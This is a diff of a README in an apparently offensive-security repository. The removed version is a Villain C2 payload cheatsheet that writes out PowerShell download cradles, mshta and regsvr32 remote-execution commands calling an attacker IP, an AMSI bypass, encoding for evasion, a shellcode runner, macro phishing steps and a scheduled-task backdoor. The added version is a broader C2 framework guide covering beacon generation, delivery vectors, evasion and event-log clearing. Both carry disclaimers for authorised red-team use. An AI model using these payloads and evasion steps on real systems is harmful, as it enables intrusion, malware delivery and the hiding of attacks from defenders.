@@ -1,512 +1,405 @@
+# Comprehensive C2 Framework Arsenal 🛡️⚔️
 
-This enhanced guide provides complete command strings, interactive inputs, and operational notes to generate a wide arsenal of payloads using Villain inside Kali Linux. These payloads are tailored for red team exercises, evasion testing, and malware lab experimentation.
+**The ultimate collection of Command & Control framework cheatsheets for red team operations, penetration testing, and security research.**
 
->  **Strictly for legal, isolated environments.** Unauthorized use is a crime.
+> **⚠️ LEGAL DISCLAIMER: This repository is for authorized security testing, research, and educational purposes only. Unauthorized use is illegal and unethical.**
 
 ---
 
-##  Starting Villain C2 Framework
+## 🎯 Framework Coverage
+
+| Framework | Type | Language | Strengths | Difficulty |
+|-----------|------|----------|-----------|------------|
+| **[Villain](VILLAIN_CHEATSHEET.md)** | HTTP/HTTPS C2 | Python | Simple, Stealthy | ⭐⭐ |
+| **[Metasploit](METASPLOIT_CHEATSHEET.md)** | Multi-Protocol | Ruby | Comprehensive, Mature | ⭐⭐⭐ |
+| **[Sliver](SLIVER_CHEATSHEET.md)** | Multi-Protocol | Go | Modern, Cross-platform | ⭐⭐⭐ |
+| **[Cobalt Strike](COBALT_STRIKE_QUICK_REF.md)** | Multi-Protocol | Java | Professional, Advanced | ⭐⭐⭐⭐ |
+| **[Empire/Starkiller](EMPIRE_STARKILLER_QUICK_REF.md)** | PowerShell-based | Python/PS | Windows-focused | ⭐⭐⭐ |
+| **[Covenant](COVENANT_QUICK_REF.md)** | HTTP/DNS | C# | .NET Integration | ⭐⭐⭐⭐ |
+
+## 📚 Quick Navigation
+
+### 🚀 **Getting Started**
+- [🎯 Choose Your Framework](#-framework-selection-guide)
+- [⚙️ Basic Setup Guide](#️-basic-setup-guide)
+- [🔧 Common Techniques](COMMON_TECHNIQUES.md)
+
+### 📋 **Individual Framework Guides**
+- [📡 Villain C2 Framework](VILLAIN_CHEATSHEET.md) - Simple HTTP/HTTPS C2
+- [🛠️ Metasploit Framework](METASPLOIT_CHEATSHEET.md) - The Swiss Army Knife
+- [⚡ Sliver C2 Framework](SLIVER_CHEATSHEET.md) - Modern Go-based C2
+- [💼 Cobalt Strike](COBALT_STRIKE_QUICK_REF.md) - Commercial Red Team Tool
+- [👑 Empire/Starkiller](EMPIRE_STARKILLER_QUICK_REF.md) - PowerShell Empire
+- [⚗️ Covenant Framework](COVENANT_QUICK_REF.md) - .NET C2 Platform
+
+### 🔬 **Advanced Topics**
+- [🌐 Cross-Framework Integration](COMMON_TECHNIQUES.md#framework-interoperability)
+- [🕵️ OPSEC Considerations](COMMON_TECHNIQUES.md#universal-opsec-practices)
+- [🏗️ Infrastructure Setup](COMMON_TECHNIQUES.md#infrastructure-setup)
+- [🧹 Cleanup Procedures](COMMON_TECHNIQUES.md#cleanup-procedures)
+
+---
+
+## 🎯 Framework Selection Guide
+
+### 🥇 **For Beginners**
+**Recommended: Villain** 
+- Simple HTTP/HTTPS communication
+- Easy payload generation
+- Minimal setup required
+- Great for learning C2 concepts
+
+### 🥈 **For Penetration Testing**
+**Recommended: Metasploit + Sliver**
+- Metasploit: Mature exploitation framework
+- Sliver: Modern, cross-platform capabilities
+- Extensive post-exploitation modules
+- Strong community support
+
+### 🥉 **For Advanced Red Teams**
+**Recommended: Cobalt Strike + Covenant**
+- Cobalt Strike: Professional malleable profiles
+- Covenant: C#/.NET integration
+- Advanced evasion capabilities
+- Team collaboration features
+
+### 🎖️ **For Specific Use Cases**
+- **Windows-Heavy Environments**: Empire/Starkiller
+- **Cross-Platform Operations**: Sliver
+- **Stealth Operations**: Villain + Custom profiles
+- **Large-Scale Campaigns**: Cobalt Strike
+
+---
+
+## ⚙️ Basic Setup Guide
+
+### 🐧 **Linux Setup (Recommended)**
 
 ```bash
+# Update system
+sudo apt update && sudo apt upgrade -y
+
+# Install essential tools
+sudo apt install -y python3 python3-pip golang-go git curl wget
+
+# Create tools directory
+mkdir -p ~/tools && cd ~/tools
+
+# Quick tool installation
+git clone https://github.com/t3l3machus/Villain.git
+git clone https://github.com/BishopFox/sliver.git
+curl https://sliver.sh/install | sudo bash
+```
+
+### 🪟 **Windows Setup**
+
+```powershell
+# Install Chocolatey (Package Manager)
+Set-ExecutionPolicy Bypass -Scope Process -Force
+iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))
+
+# Install essential tools
+choco install -y python git golang
+
+# Create tools directory
+mkdir C:\tools
+cd C:\tools
+
+# Download frameworks
+git clone https://github.com/t3l3machus/Villain.git
+```
+
+### 🍎 **macOS Setup**
+
+```bash
+# Install Homebrew
+/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
+
+# Install tools
+brew install python3 go git wget
+
+# Create tools directory
+mkdir -p ~/tools && cd ~/tools
+
+# Quick installation
+curl https://sliver.sh/install | sudo bash
+```
+
+---
+
+## 🎯 Quick Start Workflows
+
+### 🚀 **Scenario 1: Basic Web Application Testing**
+
+```bash
+# 1. Start Villain for simple C2
 cd ~/tools/Villain
-python3 villain.py
+python3 Villain.py
+
+# 2. Generate web-friendly payload
+villain > generate
+# Select: LHOST, LPORT, PAYLOAD type
+
+# 3. Host payload
+villain > http
+
+# 4. Deliver via web vulnerability
+# Use generated payload in XSS, RCE, etc.
+
+# 5. Catch shell
+villain > sessions
+villain > interact <session_id>
 ```
 
-### Useful Villain Commands:
+### 🛡️ **Scenario 2: Enterprise Red Team Assessment**
 
 ```bash
-help               # Lists all available commands
-generate           # Starts interactive payload generator
-sessions           # Lists current sessions
-interact <ID>      # Interact with a specific session
-kill <ID>          # Kill a session
-clear              # Clears the screen
-exit               # Exits Villain
+# 1. Set up Sliver for advanced operations
+sliver-server
+
+# 2. Create HTTPS listener with valid cert
+sliver > https --lhost 0.0.0.0 --lport 443 --cert /path/to/cert.pem
+
+# 3. Generate stageless beacon
+sliver > generate --https domain.com:443 --format exe --save /tmp/
+
+# 4. Deploy via multiple vectors
+# Email, USB, SMB, etc.
+
+# 5. Post-exploitation
+sliver (session) > info
+sliver (session) > ps
+sliver (session) > download sensitive.txt
+```
+
+### 🔄 **Scenario 3: Multi-Framework Integration**
+
+```bash
+# 1. Initial access via Villain (simple)
+villain > generate --payload powershell
+
+# 2. Upgrade to Metasploit (powerful)
+msfconsole
+msf6 > use exploit/multi/handler
+msf6 > set payload windows/meterpreter/reverse_https
+
+# 3. Deploy Sliver for persistence
+sliver > generate --https domain.com --beacon-interval 300s
+
+# 4. Use Cobalt Strike for advanced operations
+# Team collaboration and malleable profiles
 ```
 
 ---
 
-##  Payload Generation Recipes
+## 🔧 Common Payload Types
 
-Below are examples of command sequences and outputs for various payloads.
+### 📝 **Document-Based Payloads**
 
-### 1. PowerShell Reverse Shell
+| Type | Framework | Use Case | Detection Risk |
+|------|-----------|----------|----------------|
+| **Macro** | All | Email phishing | Medium |
+| **HTA** | Villain, Metasploit | Web delivery | Low |
+| **LNK** | All | USB/SMB delivery | Medium |
+| **ISO** | All | Email attachments | Low |
 
-```bash
-generate
-> LHOST: 192.168.251.10
-> LPORT: 65000
-> PAYLOAD: powershell
-```
+### 💻 **Executable Payloads**
 
-Generated One-liner:
+| Type | Framework | Use Case | Detection Risk |
+|------|-----------|----------|----------------|
+| **EXE** | All | Direct execution | High |
+| **DLL** | Metasploit, Sliver | Sideloading | Medium |
+| **Service** | All | Persistence | Low |
+| **Shellcode** | All | Injection | Very Low |
 
-```powershell
-powershell -w hidden -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.251.10:8080/endpoint')"
-```
+### 🌐 **Script-Based Payloads**
 
-### 2. MSBuild Payload (Inline Shellcode)
-
-```bash
-generate
-> LHOST: 192.168.251.10
-> LPORT: 65000
-> PAYLOAD: msbuild
-```
-
-Usage:
-
-```powershell
-C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe payload.csproj
-```
-
-### 3. HTA Script Dropper
-
-```bash
-generate
-> LHOST: 192.168.251.10
-> LPORT: 65000
-> PAYLOAD: hta
-```
-
-Execution:
-
-```powershell
-mshta http://192.168.251.10:8080/payload.hta
-```
-
-### 4. VBS Downloader Shell
-
-```bash
-generate
-> LHOST: 192.168.251.10
-> LPORT: 65000
-> PAYLOAD: vbs
-```
-
-Execute via:
-
-```bash
-cscript payload.vbs
-```
-
-### 5. JavaScript (WSH) Payload
-
-```bash
-generate
-> LHOST: 192.168.251.10
-> LPORT: 65000
-> PAYLOAD: js
-```
-
-Execute:
-
-```bash
-wscript payload.js
-```
-
-### 6. Macro-enabled Office Document
-
-```bash
-generate
-> LHOST: 192.168.251.10
-> LPORT: 65000
-> PAYLOAD: macro
-```
-
-Steps:
-
-- Embed the macro in a `.docm`
-    
-- Trick user to enable macros
-    
-
-### 7. DLL Payload for Sideloading
-
-```bash
-generate
-> LHOST: 192.168.251.10
-> LPORT: 65000
-> PAYLOAD: dll
-```
-
-Use with: `rundll32`, DLL hijack, or external injectors.
-
-### 8. Python Reverse Shell Executable
-
-```bash
-generate
-> LHOST: 192.168.251.10
-> LPORT: 65000
-> PAYLOAD: python_exe
-```
-
-Package with:
-
-```bash
-pyinstaller --onefile revshell.py
-```
-
-### 9. SCT/XSL Payload via WMI
-
-```bash
-generate
-> LHOST: 192.168.251.10
-> LPORT: 65000
-> PAYLOAD: sct
-```
-
-Execute:
-
-```powershell
-regsvr32 /s /n /u /i:http://192.168.251.10:8080/payload.sct scrobj.dll
-```
-
-### 10. Windows Service Binary Replacement
-
-```bash
-generate
-> LHOST: 192.168.251.10
-> LPORT: 65000
-> PAYLOAD: service
-```
-
-Usage: replace a trusted service binary path with the compiled output.
+| Type | Framework | Use Case | Detection Risk |
+|------|-----------|----------|----------------|
+| **PowerShell** | Empire, All | Windows targets | Medium |
+| **Python** | Sliver, Villain | Cross-platform | Low |
+| **Bash** | Sliver, Metasploit | Linux/macOS | Low |
+| **JavaScript** | All | Web applications | Medium |
 
 ---
 
-##  Obfuscation Enhancements
+## 🛡️ OPSEC Best Practices
 
-### PowerShell AMSI Bypass (Inject Inline)
+### 🎭 **Stealth Guidelines**
 
-```powershell
-[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
-.GetField('amsiInitFailed','NonPublic,Static')
-.SetValue($null,$true)
-```
+1. **Process Migration**
+   ```bash
+   # Target trusted processes
+   svchost.exe, explorer.exe, dllhost.exe
+   ```
 
-### Base64 Encoded One-Liner (Replace `<payload>`)
+2. **Sleep & Jitter**
+   ```bash
+   # Production environments
+   Sleep: 300-600 seconds
+   Jitter: 30-50%
+   ```
 
-```powershell
-powershell -enc <BASE64_STRING>
-```
+3. **Traffic Patterns**
+   ```bash
+   # Use legitimate domains
+   cdn.cloudflare.com
+   azure.microsoft.com
+   aws.amazon.com
+   ```
 
-Encode using:
+### 🔒 **Security Measures**
+
+1. **Encryption**: Always use HTTPS/TLS
+2. **Certificates**: Use valid, trusted certificates
+3. **Domain Fronting**: Hide true C2 infrastructure
+4. **Cleanup**: Remove artifacts after operations
+
+---
+
+## 🚨 Incident Response & Detection
+
+### 🔍 **Common IOCs to Avoid**
 
 ```bash
-echo -n 'PAYLOAD' | iconv -f ASCII -t UTF-16LE | base64 -w0
+# Suspicious process names
+evil.exe, payload.exe, shell.exe
+
+# Obvious network patterns
+Regular beacons every 60 seconds
+High-entropy domain names
+Suspicious user agents
+
+# Registry artifacts
+HKCU\Software\Classes\*\shell\*\command
+Unusual Run key entries
+
+# File system artifacts
+Files in %TEMP%, %APPDATA%
+Executable files in user directories
 ```
 
-### Invoke-Obfuscation Toolkit
+### 🧹 **Cleanup Checklist**
 
-```powershell
-Import-Module ./Invoke-Obfuscation.psd1
-Invoke-Obfuscation
-```
-
----
-
-##  Delivery Options
-
-|Vector|Tool Required|Notes|
-|---|---|---|
-|Email Phish|Social Engineer Toolkit|Embed macro or HTA|
-|USB Dropper|Manual|Shortcut + LNK or DOC bait|
-|Web Server|Villain HTTP|All payloads are auto-hosted|
-|SMB|impacket-smbserver|`\<ip>\payload.hta`|
-|ISO Image|mkisofs/genisoimage|Auto-mounted on Windows double-click|
+- [ ] Remove all uploaded files
+- [ ] Clear registry modifications
+- [ ] Delete scheduled tasks
+- [ ] Remove services
+- [ ] Clear event logs
+- [ ] Reset network configurations
+- [ ] Remove persistence mechanisms
 
 ---
 
-##  Cleanup Checklist
+## 📖 Resources & References
 
-- `Ctrl+C` to stop Villain
-    
-- Remove `/tmp/*.tmp`, `.hta`, `.vbs`, and `.ps1`
-    
-- Purge `$env:AppData`, `%TEMP%`, and PowerShell history
-    
+### 📚 **Learning Resources**
 
----
+- [MITRE ATT&CK Framework](https://attack.mitre.org/)
+- [Red Team Infrastructure Wiki](https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki)
+- [C2 Matrix](https://www.thec2matrix.com/)
+- [Red Team Notes](https://www.ired.team/)
 
-##  Final Touch Checklist
+### 🛠️ **Additional Tools**
 
--  Villain started and reachable
-    
--  Payload generated for target OS
-    
--  Payload delivered via chosen method
-    
--  Session caught and stable
-    
+- **Infrastructure**: Terraform, Ansible, Docker
+- **Evasion**: Invoke-Obfuscation, Veil, shellter
+- **Pivoting**: Chisel, ligolo-ng, rpivot
+- **Payloads**: msfvenom, donut, ScareCrow
 
----
+### 🎯 **Practice Environments**
 
-# Villain C2 Payload Command Arsenal (v2 Enhanced)
-
-This comprehensive, upgraded guide expands the Villain C2 framework’s usage into a full-featured offensive payload platform for advanced red teaming, adversary simulation, and secure lab deployment.
-
->  **Strictly for legal red teaming, penetration testing, and isolated lab use only.**
+- **VulnHub VMs**: Practice exploitation
+- **HackTheBox**: Advanced penetration testing
+- **TryHackMe**: Red team learning paths
+- **GOAD**: Active Directory lab environment
 
 ---
 
-##  Launching Villain with Robust Options
+## 🤝 Contributing
 
-```bash
-cd ~/tools/Villain
-python3 villain.py --debug --host 0.0.0.0 --port 5000
-```
+We welcome contributions to improve this collection!
 
-Options:
+### 📝 **How to Contribute**
 
-* `--debug` enables detailed error logging
-* `--host 0.0.0.0` binds to all interfaces
-* `--port` customizes web GUI listener (default: 5000)
+1. **Fork** the repository
+2. **Create** a feature branch
+3. **Add** new framework guides or improve existing ones
+4. **Test** all commands and procedures
+5. **Submit** a pull request
 
----
+### 📋 **Contribution Guidelines**
 
-##  Core Villain CLI Commands
+- ✅ Test all commands before submitting
+- ✅ Follow the established format and structure
+- ✅ Include OPSEC considerations
+- ✅ Add proper attribution and references
+- ✅ Ensure legal and ethical usage
 
-```bash
-help                   # Show all commands
-generate               # Start payload generator
-payloads               # List supported payload types
-listeners              # Show active listeners
-sessions               # View active connections
-interact <session_id>  # Get shell access to a beacon
-kill <session_id>      # Kill a session
-info <session_id>      # View session details
-clear                  # Clear the screen
-exit                   # Exit Villain CLI
-```
+### 🎯 **Wanted Contributions**
+
+- [ ] Additional C2 frameworks (Mythic, PoshC2, etc.)
+- [ ] Mobile platform payloads (Android, iOS)
+- [ ] Cloud-specific techniques (AWS, Azure, GCP)
+- [ ] Container escape techniques
+- [ ] IoT device exploitation
 
 ---
 
-##  Payload Generator Deep Dive
+## ⚖️ Legal & Ethical Considerations
 
-### Supported Payloads
+### 🚨 **IMPORTANT WARNINGS**
 
-* powershell
-* msbuild
-* hta
-* vbs
-* js
-* macro
-* dll
-* python\_exe
-* sct
-* service
-* exe
-* shellcode
+- **Authorization Required**: Only use on systems you own or have explicit permission to test
+- **Legal Compliance**: Follow all applicable laws and regulations
+- **Responsible Disclosure**: Report vulnerabilities responsibly
+- **No Malicious Use**: Do not use for criminal activities
 
-Use `payloads` to view current supported types:
+### 📜 **Ethical Guidelines**
 
-```bash
-payloads
-```
+1. **Obtain proper authorization** before any testing
+2. **Document all activities** for transparency
+3. **Minimize system impact** during testing
+4. **Protect sensitive data** discovered during assessments
+5. **Follow responsible disclosure** for vulnerabilities
 
-### Global Template
+### 🛡️ **Professional Standards**
 
-```bash
-generate
-> LHOST: 192.168.251.10
-> LPORT: 65000
-> PAYLOAD: <payload_type>
-```
+- Follow industry standards (OWASP, NIST, etc.)
+- Maintain client confidentiality
+- Provide clear reporting and remediation guidance
+- Continuously update knowledge and skills
 
 ---
 
-##  Full Payload Menu with Execution Modes
+## 📞 Support & Community
 
-### 1. PowerShell
+### 💬 **Getting Help**
 
-```powershell
-powershell -w hidden -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.251.10:8080/endpoint')"
-```
+- 🐛 **Issues**: Report bugs or request features via GitHub Issues
+- 💡 **Discussions**: Join community discussions
+- 📧 **Contact**: Reach out to maintainers for questions
 
-Optional Enhancements:
+### 🌟 **Acknowledgments**
 
-* Add AMSI bypass
-* Base64 encode entire command
-
-### 2. MSBuild Inline Shellcode
-
-```bash
-C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe payload.csproj
-```
-
----
-
-### 3. HTA Script
-
-```powershell
-mshta http://192.168.251.10:8080/payload.hta
-```
+Special thanks to the security community and the developers of:
+- Villain (@t3l3machus)
+- Metasploit (@rapid7)
+- Sliver (@BishopFox)
+- Cobalt Strike (@cobaltstrike)
+- Empire (@BC-SECURITY)
+- Covenant (@cobbr)
 
 ---
 
-### 4. VBS Execution
+<div align="center">
 
-```bash
-cscript payload.vbs
-```
+**⭐ Star this repository if you find it useful! ⭐**
 
----
+*Remember: With great power comes great responsibility. Use these tools ethically and legally.*
 
-### 5. JavaScript Payload (WSH)
-
-```bash
-wscript payload.js
-```
+</div>
 
 ---
 
-### 6. Office Macro Shell
-
-Steps:
-
-* Open Word → Developer → Macros
-* Paste generated macro
-* Save as `.docm`
-
----
-
-### 7. DLL Reverse Shell
-
-Execution via:
-
-```bash
-rundll32.exe payload.dll,Main
-```
-
-Or via any trusted sideloading binary.
-
----
-
-### 8. SCT/XSL via WMI
-
-```powershell
-regsvr32 /s /n /u /i:http://192.168.251.10:8080/payload.sct scrobj.dll
-```
-
----
-
-### 9. Python Executable
-
-Convert using PyInstaller:
-
-```bash
-pyinstaller --onefile --noconsole payload.py
-```
-
----
-
-### 10. EXE Payload
-
-```bash
-generate
-> LHOST: 192.168.251.10
-> LPORT: 65000
-> PAYLOAD: exe
-```
-
-Run directly or wrap in dropper.
-
----
-
-### 11. Shellcode Loader
-
-* Outputs raw x86/x64 shellcode
-* Can be embedded into C or C# loader
-
-Example usage in C:
-
-```c
-void (*func)() = (void(*)())shellcode;
-func();
-```
-
----
-
-##  Obfuscation & Defense Evasion
-
-### PowerShell AMSI Bypass
-
-```powershell
-[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
-.GetField('amsiInitFailed','NonPublic,Static')
-.SetValue($null,$true)
-```
-
-### Encoding to Base64
-
-```bash
-echo -n '<command>' | iconv -f ASCII -t UTF-16LE | base64 -w0
-```
-
-```powershell
-powershell -enc <base64encodedstring>
-```
-
-### Obfuscation Toolkits
-
-* `Invoke-Obfuscation`
-* `Nishang`
-* `PS>Attack`
-* `obfuscator.io` (for JS payloads)
-
----
-
-##  Delivery Vectors & Drop Methods
-
-| Method       | Example Command                                        | Notes                     |
-| ------------ | ------------------------------------------------------ | ------------------------- |
-| HTTP Server  | `python3 -m http.server 8080`                          | Auto-hosts payloads       |
-| SMB Share    | `impacket-smbserver share .`                           | Use `\\<ip>\payload.hta`  |
-| ISO Delivery | `genisoimage -o drop.iso payload.exe`                  | Windows auto-mounts ISO   |
-| USB Drop     | Copy + rename payload with shortcut icons              | Physical attack vector    |
-| Email Phish  | Use `macro`, `hta`, or `docm` payloads                 | Requires user interaction |
-| RTF Exploit  | Embed macro or shellcode into RTF using `rtf template` | Advanced targeted payload |
-| Windows Task | `schtasks /create /tn backdoor /tr "cmd /c <payload>"` | Persistence + stealth     |
-
----
-
-## Cleanup Actions
-
-```bash
-rm -rf *.hta *.vbs *.js *.ps1 *.dll *.exe *.iso *.sct *.pyc __pycache__/
-```
-
-On Windows target:
-
-```powershell
-Clear-History
-Remove-Item -Path "$env:TEMP\*" -Force -Recurse
-```
-
----
-
-## Final Execution Flow
-
-1. Start Villain C2 server
-2. Generate appropriate payload with `generate`
-3. Choose hosting & delivery vector (HTTP, SMB, ISO, etc)
-4. Deliver payload to Windows target
-5. Catch shell → `sessions` → `interact <id>`
-6. Use post-exploitation commands inside Villain
-
----
-
-##  Advanced Additions (To Explore)
-
-* [ ] Integrate Metasploit session bridge
-* [ ] Add obfuscated Empire stager compatibility
-* [ ] Combine multiple payloads into packer shell (UPX + loader)
-* [ ] Build a GUI wrapper to auto-generate and host payloads
-* [ ] Create reverse pivot tunnels with Chisel or FRP from Villain payloads
-
----
-
-Villain becomes lethal when mixed with creativity, stealth, and control. Customize every drop. Script every step. Weaponize with purpose.
-
-\-- Cxb3rf1lthl4bz
+**Last Updated**: December 2024 | **Version**: 3.0 | **Maintainer**: cxb3rf1lth
